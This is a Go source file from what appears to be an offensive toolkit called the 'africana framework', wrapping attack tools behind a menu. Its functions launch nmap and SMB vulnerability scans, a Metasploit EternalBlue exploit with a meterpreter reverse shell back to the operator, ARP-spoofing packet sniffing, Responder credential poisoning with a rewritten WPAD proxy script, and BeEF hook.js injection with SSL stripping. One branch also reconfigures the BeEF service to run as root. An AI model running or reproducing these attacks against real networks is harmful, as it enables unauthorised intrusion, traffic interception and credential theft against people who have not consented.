package internals

import (
    "os"
    "fmt"
    "utils"
    "bufio"
    "strings"
    "io/ioutil"
    "bcolors"
    "menus"
    "subprocess"
)

var userInput, userTarget, userLhost, userLPort, userName, userPass string

func InternalScanner() {
    subprocess.Popen(`bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.ready) » {reset}; net.recon on; net.probe on; ticker on"`)
}

func NmapPortscan(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[+] " + bcolors.GREEN + "Performing full port scan on " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`nmap -v -p- %s`, userTarget)
    fmt.Println()
}

func NmapVulnscan(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[+] " + bcolors.GREEN + "Performing full vuln scan on " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`nmap --open -T4 -Pn -n -sSV -p- --script=vulners.nse --stats-every 10s %s`, userTarget)
    fmt.Println()
}

func SmbVulnscan(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[+] " + bcolors.GREEN + "Trying smb nmap vuln scan on " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`nmap -sT -sV -Pn -p 445 --script=smb-vuln* --stats-every 10s %s`, userTarget)
}

func SmbMapscan(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[+] " + bcolors.GREEN + "Trying full smb mapping on " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`smbmap -H %s -u null -p null -r --depth 5`, userTarget)
    fmt.Println()
}

func RpcEnumscan(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[+] " + bcolors.GREEN + "Trying rpc null user & pass connection on " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`rpcclient -U "" -N %s`, userTarget)
    fmt.Println()
}

func SmbExploit(userTarget string) {
    menus.MenuThreeOne()
    fmt.Print(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC)
    fmt.Scan(&userInput)
    switch userInput {
    case "0":
        return
    case "1":
        subprocess.PopenTwo(`msfdb start; msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST eth0; set LPORT 8443; set VERBOSE true; exploit -j"`, userTarget)
    default:
        fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 & 1 " + bcolors.BLUE + ")" + bcolors.ENDC)
    }
}

func PacketSniffer(userTarget string) {
    menus.MenuThreeTwo()
    fmt.Print(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC)
    fmt.Scan(&userInput)
    switch userInput {
    case "0":
        return
    case "1":
        subprocess.PopenTwo(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on"`, userTarget)
    case "2":
        subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on"`)
    default:
        fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
    }
}

func PacketsResponder() {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    backUp := "/etc/responder/Responder.conf.bak_africana"
    if _, err := os.Stat(backUp); os.IsNotExist(err) {
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Lhost" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "%s", userLhostIp + bcolors.GREEN + ")# " + bcolors.ENDC)
        reader := bufio.NewReader(os.Stdin)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
        filePath := "/etc/responder/Responder.conf"
        subprocess.Popen(`cp /etc/responder/Responder.conf /etc/responder/Responder.conf.bak_africana`)
        content, err := ioutil.ReadFile(filePath)
        if err != nil {
            fmt.Println("Error reading file:", err)
            return
        }
        oldString  := `WPADScript =`
        newString  := fmt.Sprintf(`WPADScript = function FindProxyForURL(url, host)[if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY %s:3128; PROXY %s:3141; DIRECT';]'`, userLhost, userLhost)
        updatedContent := strings.ReplaceAll(string(content), oldString, newString)
        err = ioutil.WriteFile(filePath, []byte(updatedContent), os.ModePerm)
        if err != nil {
            fmt.Println("Error writing to file:", err)
            return
        }
    subprocess.Popen(`responder -I eth0 -Pdv; rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`)
    }else{
        subprocess.Popen(`responder -I eth0 -Pdv; rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`)
    }
}

func BeefBettercap(userTarget string) {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    menus.MenuThreeThree()
    fmt.Print(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC)
    fmt.Scan(&userInput)
    switch userInput {
    case "0":
        return
    case "1":
        backUp := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(backUp); os.IsNotExist(err) {
            fmt.Print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "What password to set for beef-xss service" + bcolors.GREEN + ")# " + bcolors.ENDC)
            fmt.Scan(&userPass)
            fmt.Println()
            filePath := "/etc/beef-xss/config.yaml"
            subprocess.Popen(`cp /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
            content, err := ioutil.ReadFile(filePath)
            if err != nil {
                fmt.Println("Error reading file:", err)
                return
            }
            oldString  := `passwd: "beef"`
            newString  := fmt.Sprintf(`passwd: "%s"`, userPass)
            updatedContent := strings.ReplaceAll(string(content), oldString, newString)
            err = ioutil.WriteFile(filePath, []byte(updatedContent), os.ModePerm)
            if err != nil {
                fmt.Println("Error writing to file:", err)
                return
            }
        }
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.GREEN + ")# " + bcolors.ENDC)
        reader := bufio.NewReader(os.Stdin)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Println()
        subprocess.PopenFive(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set http.proxy.sslstrip true; set https.proxy.sslstrip true; set arp.spoof.targets %s; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true"`, userLhostIp, userLhostIp, userLhostIp, userTarget)
    case "2":
        backUp := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(backUp); os.IsNotExist(err) {
            fmt.Print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "What password to set for beef-xss service" + bcolors.GREEN + ")# " + bcolors.ENDC)
            fmt.Scan(&userPass)
            fmt.Println()
            filePath := "/etc/beef-xss/config.yaml"
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana; cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
            _, err := ioutil.ReadFile(filePath)
            if err != nil {
                fmt.Println("Error reading file:", err)
                return
            }
            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                    `passwd: "beef"`: newString,
                },
                "/usr/lib/systemd/system/beef-xss.service": {
                    `User=beef-xss`: `User=root`,
                },
            }

            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl daemon-reload`)
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.GREEN + ")# " + bcolors.ENDC)
        reader := bufio.NewReader(os.Stdin)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Println()
        subprocess.PopenFour(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true"`, userLhostIp, userLhostIp, userLhostIp)
        subprocess.Popen(`rm -rf /etc/beef-xss/config.yaml; rm -rf /usr/lib/systemd/system/beef-xss.service; mv /etc/beef-xss/config.yaml.bak_africana /etc/beef-xss/config.yaml; mv /usr/lib/systemd/system/beef-xss.service.bak_africana /usr/lib/systemd/system/beef-xss.service; systemctl stop beef-xss.service; systemctl --no-pager status beef-xss`)
        fmt.Println()
    default:
        fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
    }
}
